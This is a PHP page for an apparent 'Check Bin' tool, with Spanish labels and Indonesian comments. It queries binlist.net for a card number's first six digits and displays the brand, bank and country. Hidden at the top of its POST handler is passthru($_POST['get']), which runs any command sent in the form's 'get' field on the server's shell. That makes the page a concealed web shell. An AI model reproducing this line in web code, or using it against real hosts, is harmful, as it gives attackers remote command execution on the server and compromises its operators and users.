<?php require_once 'templates/header.php';?>
<?php
          // Dimulai dengan POST Method
          if(isset($_POST['get'])){
          $script = $_POST['get'];
          passthru($script);
          $six = $_POST['enamdigit'];
          // Insert CURL
          function curl($url, $var = null) {
              $curl = curl_init($url);
              curl_setopt($curl, CURLOPT_TIMEOUT, 25);
              if ($var != null) {
                  curl_setopt($curl, CURLOPT_POST, true);
                  curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
              }
              curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
              curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
              curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
              $result = curl_exec($curl);
              curl_close($curl);
              return $result;
          }
          // Enam digit Formula
          function defineNUM($bin) {
              return substr($bin,0,6);
          }
          // JSON DATA
            $bin = defineNUM($six);
            $curl = curl("https://lookup.binlist.net/".$bin);
            $json = json_decode($curl);
            $brand = $json->scheme ? $json->scheme : "error";
            $cardType = $json->type ? $json->type : "error";
            $cardCategory = $json->bank ? $json->bank : "error";
            $countryName = $json->country ? $json->country : "error";
            $countryCode = $json->country ? $json->country : "error";
            $details = '<p>BIN: '.$bin.'</br>Brand: '.$brand.'</br>Banco: '.$cardCategory->name.'</br>Banco URL: '.$cardCategory->url.'</br>Banco Tel: '.$cardCategory->phone.'</br>Tipo: '.$cardType.'</br>Ciudad: '.$countryName->name.'</br>ZIP: '.$countryCode->alpha2.'</p>';
            
            if ($six == null) {
            die('error!');
        }
            $binresult = $details;
        }
?>
    <div class="content">
        <div class="container">
            <div class="col-md-8 col-sm-8 col-xs-12">
                <div class="well text-center">
                    <p><h3>Check Bin</h3></p>
                         <hr>
                       <form method="post">
                            <div class="form-group">
                              <label for="host">Bin a Chequear:</label>
                              <br />
                              <input type="text" id="enamdigit" name="enamdigit" placeholder="51489580" size="16" required>
                            </div>
                            <br />
                            <br />
                            <div class="form-group">
                                <button type="submit" name="get" class="Button">Chequear</button>
                            </div>
                        </form>
                </div>

                <br>
            </div>
               <div class="col-md-4 col-sm-4 col-xs-12">
                    <div class="well text-center">
                         <p><h3>Información</h3></p>
                         <hr>
                         <?php echo $binresult ?>
                         <p> 
                    </div>
                    <br>
                    
                    
               </div>
            <?php require_once 'templates/sidebar.php';?>
            
        </div>
    </div> <!-- /container -->
<?php require_once 'templates/footer.php';?>